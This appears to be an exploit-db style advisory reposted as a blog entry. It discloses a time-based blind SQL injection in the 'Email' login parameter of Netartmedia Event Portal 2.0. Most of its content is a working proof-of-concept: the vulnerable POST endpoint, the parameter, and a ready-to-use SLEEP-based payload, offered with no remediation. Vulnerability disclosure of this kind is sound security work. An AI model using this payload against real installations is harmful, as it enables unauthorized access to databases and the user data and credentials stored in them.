---
layout:     post
title:      "Netartmedia Event Portal 2.0 - 'Email' SQL Injection"
date:       2019-03-19 12:35
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Netartmedia Event Portal 2.0 - 'Email' SQL Injection
# Date: 19.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.netartmedia.net/eventportal/
# Demo Site: https://www.phpscriptdemos.com/events/
# Version: 2.0
# Tested on: Kali Linux
# CVE: N/A
# Description: Event Portal is a a web software (php script), that can be
used to create advanced and multi-user event listing and ticket selling
websites.

----- PoC: SQLi (time-based blind) -----
# POST Request: http://localhost/[PATH]/loginaction.php
# Vulnerable Parameter: Email
# Payload: '||(SELECT 0x59685353 FROM DUAL WHERE 7114=7114 AND SLEEP(5))||'
